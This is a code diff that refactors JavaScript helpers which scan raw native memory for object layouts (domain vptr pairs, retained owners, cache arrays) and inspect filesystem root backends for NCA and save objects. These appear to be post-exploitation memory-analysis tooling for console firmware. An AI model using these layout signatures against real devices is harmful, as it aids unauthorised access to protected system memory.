-                boundaryFirst, boundarySecond, boundaryManager);
+                                                              boundaryFirst, boundarySecond, boundaryManager);
+
             if (boundaryCandidate) {
                 var boundaryKey = boundaryCandidate.address.toString(16) + ":" +
                     boundaryCandidate.rootVptr.toString(16) + ":" +
                     boundaryCandidate.manager.toString(16);
+
                 if (!seen[boundaryKey]) {
                     seen[boundaryKey] = true;
                     candidates.push(boundaryCandidate);
@@ -683,9 +819,16 @@ export function scanRootDomainChunk(input) {
             }
         }
     }
+
     return {candidates, seen};
 }
 
+
+/**
+ * The same pass, filtered. The retained owner layout folds into the wrapper scan
+ * because owner starts are a subset of the wrapper range, and walking the chunk
+ * twice for both shapes would double the read cost of the capture.
+ */
 export function scanRootDomainChunkPrefiltered(input) {
     const config = input.config;
     const buffer = input.buffer;
@@ -699,81 +842,106 @@ export function scanRootDomainChunkPrefiltered(input) {
         var candidateAddress = chunkAddress + offset;
         var candidatePointer = buffer + offsetAddress;
 
-        // The owner layout has stricter guards than a domain wrapper. Fold
-        // its scan into this aligned pass so we do not walk every word a
-        // second time. Owner starts are a subset of the wrapper scan range.
-        if (offset + 0x78 <= config.ROOT_CAPTURE_CHUNK &&
-            read64(candidatePointer + 0x20n) === input.retainedOwnerSize &&
-            read64(candidatePointer + 0x28n) === 0x4000n &&
-            read64(candidatePointer + 0x50n) === 0x5A0n &&
-            Number(read32(candidatePointer + 0x58n)) === 10 &&
-            read64(candidatePointer + 0x60n) === 14n) {
+        /*
+         * The owner layout guards more strictly than a plain domain wrapper, so its
+         * scan folds into this aligned pass instead of walking every word twice.
+         * Owner starts are a subset of the wrapper scan range.
+         */
+        if (isRetainedOwnerAtPointer(offset, config, candidatePointer, input)) {
             input.rememberRetainedOwner(candidateAddress,
-                input.copyNativeBytes(candidatePointer, 0x78), 0);
+                                        input.copyNativeBytes(candidatePointer, 0x78), 0);
         }
 
         var candidateFirst = read64(candidatePointer);
         var candidateSecond = undefined; // Fresh value for this slot.
-        // A domain candidate must have a canonical first word. Fetch the
-        // second word only for that necessary condition or a cache-array
-        // header match, which keeps both searches complete.
+
+        /*
+         * A domain candidate needs a canonical first word. The second word is only
+         * fetched when that condition holds or when a cache-array header matches,
+         * so both searches still run to completion.
+         */
         if (input.scanRetainedArrays && offset + 0x5A0 <=
                 config.ROOT_CAPTURE_CHUNK &&
             candidateFirst === input.retainedHeader0) {
             candidateSecond = read64(candidatePointer + 8n);
-            if (candidateSecond === input.retainedHeader1 &&
-                Number(read8(candidatePointer + 0x10n)) === 0 &&
-                read64(candidatePointer + 0x18n) === 0n &&
-                read64(candidatePointer + 0x20n) === 0n &&
-                read64(candidatePointer + 0x28n) === 0n) {
+
+            if (isRetainedArrayAtPointer(candidateSecond, candidatePointer,
+                                         input)) {
                 input.rememberRetainedArray(candidateAddress,
-                    input.copyNativeBytes(candidatePointer, 0x5A0), 0);
+                                            input.copyNativeBytes(candidatePointer, 0x5A0), 0);
             }
         }
+
         if (candidateFirst < 0x28E0n ||
-            !RootLayout.isCanonicalPointer(candidateFirst)) continue;
-        if (candidateSecond === undefined)
+            !RootLayout.isCanonicalPointer(candidateFirst)) {
+            continue;
+        }
+
+        if (candidateSecond === undefined) {
             candidateSecond = read64(candidatePointer + 8n);
-        if (candidateSecond - candidateFirst !== 0x58n) continue;
+        }
+
+        if (candidateSecond - candidateFirst !== 0x58n) {
+            continue;
+        }
+
         var vptrPairRoot = candidateFirst - 0x28E0n;
+
         if (!RootLayout.isCanonicalPointer(candidateSecond) ||
             !RootLayout.isCanonicalPointer(vptrPairRoot) ||
-            vptrPairRoot + 0x5880n >= 0x8000000000n) continue;
+            vptrPairRoot + 0x5880n >= 0x8000000000n) {
+            continue;
+        }
+
         var candidateManager = read64(candidatePointer + 0x18n);
         var candidate = recordRootDomainCandidate(candidateAddress,
-            candidateFirst, candidateSecond, candidateManager);
+                                                  candidateFirst, candidateSecond, candidateManager);
+
         if (candidate) {
             var key = candidate.address.toString(16) + ":" +
                 candidate.rootVptr.toString(16) + ":" +
                 candidate.manager.toString(16);
-            if (!seen[key]) { seen[key] = true; candidates.push(candidate); }
+
+            if (!seen[key]) {
+                seen[key] = true;
+                candidates.push(candidate);
+            }
         }
     }
 
     if (carry && carry.bytes.length === 0x18) {
-        var boundary = carry.bytes.concat(
-            input.copyNativeBytes(buffer, 0x18));
+        var boundary = carry.bytes.concat(input.copyNativeBytes(buffer, 0x18));
         for (var boundaryOffset = 0; boundaryOffset < 0x18;
             boundaryOffset += 8) {
             var boundaryAddress = carry.address + boundaryOffset;
             var boundaryFirst = AnalysisBytes.readU64LE(boundary, boundaryOffset);
             var boundarySecond = AnalysisBytes.readU64LE(boundary,
-                boundaryOffset + 8);
+                                                         boundaryOffset + 8);
+
             if (boundarySecond - boundaryFirst !== 0x58n ||
-                boundaryFirst < 0x28E0n) continue;
+                boundaryFirst < 0x28E0n) {
+                continue;
+            }
+
             var boundaryRootVptr = boundaryFirst - 0x28E0n;
+
             if (!RootLayout.isCanonicalPointer(boundaryFirst) ||
                 !RootLayout.isCanonicalPointer(boundarySecond) ||
                 !RootLayout.isCanonicalPointer(boundaryRootVptr) ||
-                boundaryRootVptr + 0x5880n >= 0x8000000000n) continue;
+                boundaryRootVptr + 0x5880n >= 0x8000000000n) {
+                continue;
+            }
+
             var boundaryManager = AnalysisBytes.readU64LE(boundary,
-                boundaryOffset + 0x18);
+                                                          boundaryOffset + 0x18);
             var boundaryCandidate = recordRootDomainCandidate(boundaryAddress,
-                boundaryFirst, boundarySecond, boundaryManager);
+                                                              boundaryFirst, boundarySecond, boundaryManager);
+
             if (boundaryCandidate) {
                 var boundaryKey = boundaryCandidate.address.toString(16) + ":" +
                     boundaryCandidate.rootVptr.toString(16) + ":" +
                     boundaryCandidate.manager.toString(16);
+
                 if (!seen[boundaryKey]) {
                     seen[boundaryKey] = true;
                     candidates.push(boundaryCandidate);
@@ -781,36 +949,44 @@ export function scanRootDomainChunkPrefiltered(input) {
             }
         }
     }
+
     return {candidates, seen};
 }
 
+/** Copy the last 0x18 bytes of a capture chunk, which carry the domain tail. */
 export function captureDomainTail(input) {
     const config = input.config;
     const buffer = input.buffer;
     const chunkAddress = input.chunkAddress;
-    var bytes = input.copyNativeBytes(
-        buffer + BigInt(config.ROOT_CAPTURE_CHUNK - 0x18), 0x18);
+    var bytes = input.copyNativeBytes(buffer + BigInt(config.ROOT_CAPTURE_CHUNK - 0x18), 0x18);
     return {address: chunkAddress + config.ROOT_CAPTURE_CHUNK - 0x18,
         bytes: bytes};
 }
 
+/** Build one domain candidate and drop it when its root vptr falls outside user space. */
 export function recordRootDomainCandidate(address, first, second, manager) {
     var candidate = RootLayout.makeDomainCandidate(address, first, second,
-        manager, {domainVptrDelta: 0x58n, rootVptrDelta: 0x28E0n});
-    if (!candidate || BigInt(candidate.rootVptr) + 0x5880n >= 0x8000000000n)
+                                                   manager, {domainVptrDelta: 0x58n, rootVptrDelta: 0x28E0n});
+
+    if (!candidate || BigInt(candidate.rootVptr) + 0x5880n >= 0x8000000000n) {
         return null;
+    }
+
     return candidate;
 }
 
-// ── Root backend inspection ───────────────────────────────────────────────
+// ----- Root backend inspection -----
 
-// The reference fs-root-pid implementation follows each root pointer and
-// checks raw == control + 0x18, a canonical backend vptr, and PID == root PID or 1.
-// It does not provide a firmware-specific exact NCA/save vtable constant, so
-// this guard records vptr shape without claiming a concrete class identity.
+/*
+ * The reference fs-root-pid implementation follows each root pointer and checks
+ * raw == control + 0x18, a canonical backend vptr, and PID == root PID or 1. It has
+ * no firmware-specific NCA or save vtable constant, so this guard records the vptr
+ * shape and never claims a concrete class identity.
+ */
 export async function inspectRootBackend(name, raw, control, pidOffset, rootPid,
-    outputBuf, input) {
+                                         outputBuf, input) {
     var expectedPidOffset = -1;
+
     if (name === "nca") {
         expectedPidOffset = 0x20;
     } else if (name === "save") {
@@ -820,13 +996,16 @@ export async function inspectRootBackend(name, raw, control, pidOffset, rootPid,
     var linksOk = expectedPidOffset === pidOffset &&
         RootLayout.isCanonicalPointer(raw) && RootLayout.isCanonicalPointer(control) &&
         raw === control + 0x18n;
-    if (!linksOk)
+
+    if (!linksOk) {
         return {name: name, read: false, linksOk: false,
             vptrShapeOk: false, pidOk: false, stable: false};
+    }
 
     var backendAddress = Number(raw);
     var backendRead = await readFsAddressBytes({...input,
         address: backendAddress, length: 0x60, outputBuf});
+
     if (!backendRead.ok) {
         return {name: name, read: false, linksOk: true,
             vptrShapeOk: false, pidOk: false, stable: false};
@@ -834,6 +1013,7 @@ export async function inspectRootBackend(name, raw, control, pidOffset, rootPid,
 
     var vptr = AnalysisBytes.readU64LE(backendRead.bytes, 0);
     var vptrShapeOk = RootLayout.isCanonicalPointer(vptr);
+
     if (!vptrShapeOk) {
         return {name: name, read: true, linksOk: true,
             vptrShapeOk: false, pidOk: false, stable: false};
@@ -846,9 +1026,26 @@ export async function inspectRootBackend(name, raw, control, pidOffset, rootPid,
     var reread = await readFsAddressBytes({...input,
         address: backendAddress, length: 0x60, outputBuf});
     var stable = reread.ok && AnalysisBytes.equal(reread.bytes,
-        backendRead.bytes);
+                                                  backendRead.bytes);
     return {name: name, address: backendAddress, read: true,
         linksOk: linksOk, vptrShapeOk: vptrShapeOk, pidOk: pidOk,
         stable: stable, vptr: vptr, pid: pid,
         bytes: backendRead.bytes.slice()};
+}
+
+function isRetainedOwnerAtPointer(offset, config, candidatePointer, input) {
+    return offset + 0x78 <= config.ROOT_CAPTURE_CHUNK &&
+        read64(candidatePointer + 0x20n) === input.retainedOwnerSize &&
+        read64(candidatePointer + 0x28n) === 0x4000n &&
+        read64(candidatePointer + 0x50n) === 0x5A0n &&
+        Number(read32(candidatePointer + 0x58n)) === 10 &&
+        read64(candidatePointer + 0x60n) === 14n;
+}
+
+function isRetainedArrayAtPointer(candidateSecond, candidatePointer, input) {
+    return candidateSecond === input.retainedHeader1 &&
+        Number(read8(candidatePointer + 0x10n)) === 0 &&
+        read64(candidatePointer + 0x18n) === 0n &&
+        read64(candidatePointer + 0x20n) === 0n &&
+        read64(candidatePointer + 0x28n) === 0n;
 }
